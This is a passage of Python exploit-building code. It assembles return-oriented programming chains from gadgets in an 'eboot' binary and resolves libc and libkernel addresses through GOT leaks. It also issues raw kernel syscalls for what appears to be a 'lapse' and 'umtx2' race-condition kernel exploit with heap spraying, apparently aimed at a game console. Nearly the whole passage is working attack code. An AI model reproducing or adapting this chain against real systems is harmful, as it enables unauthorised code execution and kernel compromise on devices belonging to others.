                    0x1D2,
                    [1, 0, msg_addr + spec["rtprio"], 0, 0, 0],
                    spec["rtprio_ret"],
                    spec["segment"] + 0x80,
                )
                t_store_imm64(msg_addr + spec["ready"], 1)
                t_syscall(
                    0x003,
                    [("mem64", msg_addr + read_fd_qword_off), msg_addr + spec["byte"], 1, 0, 0, 0],
                    spec["read_ret"],
                    spec["segment"] + 0x100,
                )
                destroy_idx = 0 if spec["result"] == 0xD0 else 1 if spec["result"] == 0xF8 else -1
                delay_this = (
                    spec["op"] == 0x0004
                    and destroy_delay_yields
                    and destroy_delay_target in ("both", f"d{destroy_idx}")
                )
                pad_this = (
                    spec["op"] == 0x0004
                    and destroy_pad_count
                    and destroy_pad_target in ("both", f"d{destroy_idx}")
                )
                if pad_this:
                    for _ in range(destroy_pad_count):
                        tq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                        tq(0)
                for i in range(destroy_delay_yields if delay_this else 0):
                    t_syscall(
                        0x14B,
                        [0, 0, 0, 0, 0, 0],
                        0x2C0 + destroy_idx * 0x20 + i * 8,
                        spec["segment"] + 0x140 + i * 0x40,
                    )
                op_segment = spec["segment"] + (0x140 + destroy_delay_yields * 0x40 if delay_this else 0x180)
                t_syscall(
                    0x1C6,
                    [0, 26, spec["op"], msg_addr + key_off, 0, 0],
                    spec["result"],
                    op_segment,
                )
                if worker_spray and spec["op"] == 0x0004 and inline_spray_count:
                    spray_segment = spec["segment"] + 0x200
                    if worker_spray_gate:
                        t_syscall(
                            0x003,
                            [("mem64", msg_addr + spray_read_fd_qword_off), msg_addr + spec["byte"], 1, 0, 0, 0],
                            0x2D8 + destroy_idx * 0x20,
                            spray_segment,
                        )
                    else:
                        t_syscall(
                            0x14B,
                            [0, 0, 0, 0, 0, 0],
                            0x2C0 + destroy_idx * 0x20,
                            spray_segment,
                        )
                    spray_segment += 0x40
                    if main_tag_worker_fds:
                        for i in range(destroy_idx, inline_spray_count, 2):
                            fd_slot = 0x220 + i * 8
                            t_syscall(
                                0x1C6,
                                [0, 26, 0x0001, msg_addr + secondary_key_off, 0, 0],
                                fd_slot,
                                spray_segment,
                            )
                            spray_segment += 0x40
                        if worker_spray_gate:
                            t_syscall(
                                0x003,
                                [("mem64", msg_addr + spray_read_fd_qword_off), msg_addr + spec["byte"], 1, 0, 0, 0],
                                0x5C0 + destroy_idx * 0x20,
                                spray_segment,
                            )
                        else:
                            t_syscall(
                                0x14B,
                                [0, 0, 0, 0, 0, 0],
                                0x5C0 + destroy_idx * 0x20,
                                spray_segment,
                            )
                        spray_segment += 0x40
                        for i in range(destroy_idx, inline_spray_count, 2):
                            destroy_slot = 0x2A0 + i * 8
                            t_syscall(
                                0x1C6,
                                [0, 26, 0x0004, msg_addr + secondary_key_off, 0, 0],
                                destroy_slot,
                                spray_segment,
                            )
                            spray_segment += 0x40
                    else:
                        for i in range(destroy_idx, inline_spray_count, 2):
                            size_value = 0x100000 + i * 0x4000
                            fd_slot = 0x220 + i * 8
                            trunc_slot = 0x260 + i * 8
                            destroy_slot = 0x2A0 + i * 8
                            t_syscall(
                                0x1C6,
                                [0, 26, 0x0001, msg_addr + secondary_key_off, 0, 0],
                                fd_slot,
                                spray_segment,
                            )
                            spray_segment += 0x40
                            t_syscall(
                                0x1E0,
                                [("mem64", msg_addr + fd_slot), size_value, 0, 0, 0, 0],
                                trunc_slot,
                                spray_segment,
                            )
                            spray_segment += 0x40
                            t_syscall(
                                0x1C6,
                                [0, 26, 0x0004, msg_addr + secondary_key_off, 0, 0],
                                destroy_slot,
                                spray_segment,
                            )
                            spray_segment += 0x40
                t_store_imm64(msg_addr + spec["done"], 1)
                t_syscall(
                    0x1AF,
                    [0, 0, 0, 0, 0, 0],
                    spec["exit_ret"],
                    (spray_segment if worker_spray and spec["op"] == 0x0004 and inline_spray_count else op_segment + 0x80),
                )
                if spec["rop"] + len(thread) > spec["tls"]:
                    raise RuntimeError("umtx2 race thread ROP overlaps TLS")
                msg[spec["rop"]:spec["rop"] + len(thread)] = thread

            for spec in thread_specs:
                build_umtx_thread(spec)

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            for segment_off in worker_segments:
                emit_store_qword(msg_addr + segment_off, msg_addr + 0x08)

            def emit_rax_to_rdi():
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
                for _ in range(5):
                    emitq(0)

            def emit_main_rdi_arg(value):
                if isinstance(value, tuple) and value[0] == "mem64":
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value[1])
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_rax_to_rdi()
                else:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(value & 0xFFFFFFFFFFFFFFFF)

            def emit_umtx_checkpoint(size=0x430):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(size)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

            def emit_copy_dword_to_qword_slot(src_addr, dst_addr):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(src_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(dst_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)

            def emit_umtx_main_syscall(sysno, supplied, result_off, segment_off, post_ops=None, clear_tail=False):
                segment_addr = msg_addr + segment_off
                emit_store_qword(segment_addr, msg_addr + 0x08)

                if clear_tail:
                    if race_debug_checkpoints:
                        emit_store_imm64(msg_addr + 0x18, 11)
                        emit_umtx_checkpoint()
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(0)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                    if race_debug_checkpoints:
                        emit_store_imm64(msg_addr + 0x18, 12)
                        emit_umtx_checkpoint()

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emit_main_rdi_arg(supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def sq(value):
                    segment.extend(pack64(value))

                def sdword(src_addr, dst_addr):
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(src_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    sq(dst_addr)
                    sq(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)

                sq(0)
                sq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                sq(msg_addr + result_off)
                sq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if post_ops == "socketpair_fds_to_slots":
                    sdword(msg_addr + barrier_pair_off, msg_addr + read_fd_qword_off)
                    sdword(msg_addr + barrier_pair_off + 4, msg_addr + write_fd_qword_off)
                sq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                sq(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            emit_store_imm64(msg_addr + 0x18, 1)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            if worker_spray:
                main_socketpair_seg = 0x2840
                main_spray_socketpair_seg = 0x2880
                main_thr0_seg = 0x28C0
                main_thr1_seg = 0x2900
                main_thr2_seg = 0x2940
                main_pre_yield_seg = 0x2980
                main_create_seg = 0x2A80
                main_trunc_seg = 0x2AC0
                main_close_create_seg = 0x2B00
                main_release_seg = 0x2B40
                main_post_yield_seg = 0x2B80
                main_final_seg = 0x3740
                main_stride = 0x40
            else:
                main_socketpair_seg = 0x2900
                main_spray_socketpair_seg = None
                main_thr0_seg = 0x2980
                main_thr1_seg = 0x2A00
                main_thr2_seg = 0x2A80
                main_pre_yield_seg = 0x2B00
                main_create_seg = 0x2D00
                main_trunc_seg = 0x2D80
                main_close_create_seg = 0x2E00
                main_release_seg = 0x2E80
                main_post_yield_seg = 0x2F00
                main_final_seg = 0x31C0
                main_stride = 0x80
            emit_umtx_main_syscall(0x087, [1, 1, 0, msg_addr + barrier_pair_off, 0, 0], 0x20, main_socketpair_seg, clear_tail=True)
            emit_copy_dword_to_qword_slot(msg_addr + barrier_pair_off, msg_addr + read_fd_qword_off)
            emit_copy_dword_to_qword_slot(msg_addr + barrier_pair_off + 4, msg_addr + write_fd_qword_off)
            if worker_spray and worker_spray_gate:
                emit_umtx_main_syscall(
                    0x087,
                    [1, 1, 0, msg_addr + spray_pair_off, 0, 0],
                    0x80,
                    main_spray_socketpair_seg,
                )
                emit_copy_dword_to_qword_slot(msg_addr + spray_pair_off, msg_addr + spray_read_fd_qword_off)
                emit_copy_dword_to_qword_slot(msg_addr + spray_pair_off + 4, msg_addr + spray_write_fd_qword_off)
            emit_store_imm64(msg_addr + 0x18, 21)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            emit_store_imm64(msg_addr + 0x18, 2)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            emit_umtx_main_syscall(0x1C7, [msg_addr + thread_specs[0]["args"], 0x68, 0, 0, 0, 0], 0x28, main_thr0_seg)
            emit_store_imm64(msg_addr + 0x18, 3)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            emit_umtx_main_syscall(0x1C7, [msg_addr + thread_specs[1]["args"], 0x68, 0, 0, 0, 0], 0x30, main_thr1_seg)
            emit_store_imm64(msg_addr + 0x18, 4)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            emit_umtx_main_syscall(0x1C7, [msg_addr + thread_specs[2]["args"], 0x68, 0, 0, 0, 0], 0x38, main_thr2_seg)
            emit_store_imm64(msg_addr + 0x18, 5)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            for i in range(4):
                emit_umtx_main_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x120 + i * 8, main_pre_yield_seg + i * main_stride)
            emit_umtx_main_syscall(0x1C6, [0, 26, 0x0001, msg_addr + key_off, 0, 0], 0x40, main_create_seg)
            emit_umtx_main_syscall(0x1E0, [("mem64", msg_addr + 0x40), 0x4000, 0, 0, 0, 0], 0x48, main_trunc_seg)
            emit_umtx_main_syscall(0x006, [("mem64", msg_addr + 0x40), 0, 0, 0, 0, 0], 0x50, main_close_create_seg)
            emit_store_imm64(msg_addr + 0x18, 6)
            if race_debug_checkpoints:
                emit_umtx_checkpoint()
            emit_umtx_main_syscall(0x004, [("mem64", msg_addr + write_fd_qword_off), msg_addr + barrier_buf_off, 3, 0, 0, 0], 0x58, main_release_seg)
            for i in range(6):
                emit_umtx_main_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x140 + i * 8, main_post_yield_seg + i * main_stride)
            if worker_spray and worker_spray_gate and inline_spray_count:
                segment_off = main_final_seg
                emit_umtx_main_syscall(
                    0x004,
                    [("mem64", msg_addr + spray_write_fd_qword_off), msg_addr + spray_buf_off, 2, 0, 0, 0],
                    0x1B8,
                    segment_off,
                )
                segment_off += 0x40
                for i in range(worker_spray_post_yields):
                    emit_umtx_main_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x580 + i * 8, segment_off)
                    segment_off += 0x40
                main_final_after_gate_seg = segment_off
            else:
                main_final_after_gate_seg = main_final_seg
            if lowrop_umtx2_preserve_lookup_fd:
                emit_store_imm64(msg_addr + 0x18, 6)
                emit_umtx_checkpoint(size=0x730)
            else:
                if inline_spray_count:
                    emit_store_imm64(msg_addr + 0x18, 6)
                    emit_umtx_checkpoint(size=0x730)
                segment_off = main_final_after_gate_seg
                if not worker_spray:
                    for core_round, spec_idx in enumerate((1, 2)):
                        if inline_spray_count:
                            emit_umtx_main_syscall(
                                0x1E8,
                                [3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, msg_addr + thread_specs[spec_idx]["mask"], 0],
                                0x170 + core_round * 8,
                                segment_off,
                            )
                            segment_off += 0x40
                        for i in range(core_round, inline_spray_count, 2):
                            size_value = 0x100000 + i * 0x4000
                            fd_slot = 0x220 + i * 8
                            trunc_slot = 0x260 + i * 8
                            destroy_slot = 0x2A0 + i * 8
                            emit_umtx_main_syscall(0x1C6, [0, 26, 0x0001, msg_addr + secondary_key_off, 0, 0], fd_slot, segment_off)
                            segment_off += 0x40
                            emit_umtx_main_syscall(0x1E0, [("mem64", msg_addr + fd_slot), size_value, 0, 0, 0, 0], trunc_slot, segment_off)
                            segment_off += 0x40
                            emit_umtx_main_syscall(0x1C6, [0, 26, 0x0004, msg_addr + secondary_key_off, 0, 0], destroy_slot, segment_off)
                            segment_off += 0x40
                elif worker_spray and main_tag_worker_fds:
                    for i in range(inline_spray_count):
                        size_value = 0x100000 + i * 0x4000
                        fd_slot = 0x220 + i * 8
                        trunc_slot = 0x260 + i * 8
                        emit_umtx_main_syscall(
                            0x1E0,
                            [("mem64", msg_addr + fd_slot), size_value, 0, 0, 0, 0],
                            trunc_slot,
                            segment_off,
                        )
                        segment_off += 0x40
                    if worker_spray_gate:
                        emit_umtx_main_syscall(
                            0x004,
                            [("mem64", msg_addr + spray_write_fd_qword_off), msg_addr + spray_buf_off, 2, 0, 0, 0],
                            0x5B0,
                            segment_off,
                        )
                        segment_off += 0x40
                        for i in range(worker_spray_post_yields):
                            emit_umtx_main_syscall(0x14B, [0, 0, 0, 0, 0, 0], 0x5D0 + i * 8, segment_off)
                            segment_off += 0x40
                emit_umtx_main_syscall(0x0BD, [("mem64", msg_addr + 0xA8), msg_addr + stat_off, 0, 0, 0, 0], 0x60, segment_off)
                segment_off += 0x40
                emit_umtx_main_syscall(0x006, [("mem64", msg_addr + read_fd_qword_off), 0, 0, 0, 0, 0], 0x70, segment_off)
                segment_off += 0x40
                emit_umtx_main_syscall(0x006, [("mem64", msg_addr + write_fd_qword_off), 0, 0, 0, 0, 0], 0x78, segment_off)
                emit_store_imm64(msg_addr + 0x18, 7)
                emit_umtx_checkpoint(size=0x730)

        elif lowrop_lapse_preflight:
            source_off = LIBKERNEL_SYS_GETTIMEOFDAY
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_lapse_syscall(sysno, supplied, result_off, segment_off, post_ops=None):
                segment_addr = msg_addr + segment_off

                # Fill segment[0] with the runtime-derived "mov r10, rcx; syscall" target.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x08)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_store_rax(segment_addr)

                # Zero r8/r9 through send(fd, msg, 0, 0), then reload r8 with arg5.
                # The compact mode emits that zeroing call once before the Lapse
                # sequence.  The direct syscall path only clobbers rcx/r11, so
                # r9 should remain zero while r8 is reloaded for each syscall.
                if not lowrop_lapse_prezero_r9_once:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(0)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(supplied[0] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(segment_addr)

                resume_addr = chain_addr + len(chain)
                segment = bytearray()

                def segment_qword(value):
                    segment.extend(pack64(value))

                segment_qword(0)
                segment_qword(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                segment_qword(msg_addr + result_off)
                segment_qword(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if post_ops == "socketpair_fd_to_aio_req":
                    segment_qword(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    segment_qword(msg_addr + 0x220)
                    segment_qword(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    segment_qword(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    segment_qword(msg_addr + 0x300 + 0x20)
                    segment_qword(args.eboot_base + REDIS_EBOOT_MOV_DWORD_PTR_RDI_EAX_RET)
                segment_qword(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                segment_qword(resume_addr)
                msg[segment_off:segment_off + len(segment)] = segment

            y2jb_tests = [
                (0x014, [0, 0, 0, 0, 0, 0]),  # getpid
                (0x1B0, [msg_addr + 0x260, 0, 0, 0, 0, 0]),  # thr_self
                (0x14B, [0, 0, 0, 0, 0, 0]),  # sched_yield
                (0x1DD, [0, 0x4000, 3, 0x1002, 0xFFFFFFFFFFFFFFFF, 0]),  # mmap
                (0x1E7, [3, 1, 0xFFFFFFFFFFFFFFFF, 0x10, msg_addr + 0x200, 0]),  # cpuset_getaffinity
                (0x1D2, [0, 0, msg_addr + 0x210, 0, 0, 0]),  # rtprio_thread get
                (0x061, [28, 2, 17, 0, 0, 0]),  # socket(AF_INET6, SOCK_DGRAM, UDP)
                (0x087, [1, 1, 0, msg_addr + 0x220, 0, 0], "socketpair_fd_to_aio_req"),  # socketpair(AF_UNIX, SOCK_STREAM)
                (0x21A, [msg_addr + 0x240, 0, 0xF00, 0, 0, 0]),  # evf_create("", 0, 0xf00)
                (0x298, [msg_addr + 0x400, 0, msg_addr + 0x440, 0, 0, 0]),  # aio_multi_poll
                (0x29A, [msg_addr + 0x400, 0, msg_addr + 0x440, 0, 0, 0]),  # aio_multi_cancel
                (0x296, [msg_addr + 0x400, 0, msg_addr + 0x440, 0, 0, 0]),  # aio_multi_delete
                (0x297, [msg_addr + 0x400, 0, msg_addr + 0x440, 1, 0, 0]),  # aio_multi_wait
                (0x29D, [0x1001, msg_addr + 0x300, 0, 3, msg_addr + 0x400, 0]),  # aio_submit_cmd
                (0x29D, [1, msg_addr + 0x300, 1, 3, msg_addr + 0x420, 0]),  # active aio_submit_cmd(read)
                (0x29A, [msg_addr + 0x420, 1, msg_addr + 0x450, 0, 0, 0]),  # active aio_multi_cancel
                (0x298, [msg_addr + 0x420, 1, msg_addr + 0x450, 0, 0, 0]),  # active aio_multi_poll
                (0x296, [msg_addr + 0x420, 1, msg_addr + 0x450, 0, 0, 0]),  # active aio_multi_delete
            ]
            struct.pack_into("<Q", msg, 0x18, len(y2jb_tests))
            for idx, item in enumerate(y2jb_tests):
                if len(item) == 3:
                    sysno, supplied, post_ops = item
                else:
                    sysno, supplied = item
                    post_ops = None
                struct.pack_into("<Q", msg, 0x100 + idx * 8, sysno)
                emit_lapse_syscall(sysno, supplied, 0x40 + idx * 8, 0x500 + idx * 0x80, post_ops)

        elif lowrop_lapse_thread_preflight:
            source_got = args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT
            ret0 = args.eboot_base + REDIS_EBOOT_RET_IMM_BY_MOD[0][0]

            jmpbuf_off = 0x500
            thr_args_off = 0x580
            child_tid_off = 0x610
            parent_tid_off = 0x618
            thread_stack_off = 0x700
            thread_stack_size = 0x800
            tls_off = 0x1600
            tls_size = 0x80
            thread_rop_off = 0x1000
            thread_marker = 0x315348545350414C  # LAPSTHS1
            thread_call_slot = thread_rop_off + 10 * 8

            if args.lowrop_lapse_thread_start == "pivot":
                struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                struct.pack_into("<Q", msg, thread_stack_off + thread_stack_size + 8, msg_addr + thread_rop_off)
            elif args.lowrop_lapse_thread_start == "setcontext":
                struct.pack_into("<Q", msg, jmpbuf_off + 0x38, msg_addr + thread_rop_off)
                struct.pack_into("<Q", msg, jmpbuf_off + 0x80, args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            else:
                struct.pack_into("<Q", msg, jmpbuf_off + 0x00, ret0)
                struct.pack_into("<Q", msg, jmpbuf_off + 0x10, msg_addr + thread_rop_off)
                struct.pack_into("<I", msg, jmpbuf_off + 0x40, 0x037F)
                struct.pack_into("<I", msg, jmpbuf_off + 0x44, 0x1F80)

            struct.pack_into("<Q", msg, thr_args_off + 0x08, msg_addr + jmpbuf_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x10, msg_addr + thread_stack_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x18, thread_stack_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x20, msg_addr + tls_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x28, tls_size)
            struct.pack_into("<Q", msg, thr_args_off + 0x30, msg_addr + child_tid_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x38, msg_addr + parent_tid_off)
            struct.pack_into("<Q", msg, thr_args_off + 0x00, ret0)
            if args.lowrop_lapse_thread_start == "pivot":
                struct.pack_into("<Q", msg, thr_args_off + 0x00, args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                struct.pack_into("<Q", msg, thr_args_off + 0x08, 0)

            if args.lowrop_lapse_thread_start == "pivot":
                thread_rop = [
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + 0x38,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    thread_marker,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    0x1AF,  # thr_exit
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    0,
                    0,  # runtime syscall target is patched here before thr_new
                    0,
                ]
                thread_call_slot = thread_rop_off + 9 * 8
            elif args.lowrop_lapse_thread_start == "setcontext":
                thread_rop = [
                    msg_addr + 0x38,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    thread_marker,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    0x1AF,  # thr_exit
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    0,
                    0,  # runtime syscall target is patched here before thr_new
                    0,
                ]
                thread_call_slot = thread_rop_off + 8 * 8
            else:
                thread_rop = [
                    ret0,
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    msg_addr + 0x38,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    thread_marker,
                    args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET,
                    args.eboot_base + REDIS_EBOOT_POP_RAX_RET,
                    0x1AF,  # thr_exit
                    args.eboot_base + REDIS_EBOOT_POP_RDI_RET,
                    0,
                    0,  # runtime syscall target is patched here before thr_new
                    0,
                ]
                thread_call_slot = thread_rop_off + 10 * 8
            for i, q in enumerate(thread_rop):
                struct.pack_into("<Q", msg, thread_rop_off + i * 8, q & 0xFFFFFFFFFFFFFFFF)

            # msg+0x10 = live gettimeofday wrapper; msg+0x08 = syscall instruction target.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x10)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emit_pop_rdx_padded(7)
            emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + 0x08)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr + thread_call_slot)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if args.lowrop_lapse_thread_start != "pivot":
                # Derive libc base from eboot's live memcpy GOT, then patch start_func if needed.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded((-LIBC_MEMCPY_EXPORT) & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x20)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                start_offset = LIBC_SETCONTEXT if args.lowrop_lapse_thread_start == "setcontext" else LIBC_LONGJMP
                emit_pop_rdx_padded(start_offset)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x28)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                if args.lowrop_lapse_thread_start in ("longjmp", "setcontext"):
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + thr_args_off)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_thread_syscall(sysno, supplied, result_off, segment_off):
                segment_addr = msg_addr + segment_off
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x08)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_store_rax(segment_addr)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_R8_PAD_RET)
                emitq(supplied[4] & 0xFFFFFFFFFFFFFFFF)
                emitq(0)
                emitq(0)
                emitq(0)
                emit_pop_rdx_padded(supplied[2] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(supplied[3] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(supplied[0] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(supplied[1] & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(sysno & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
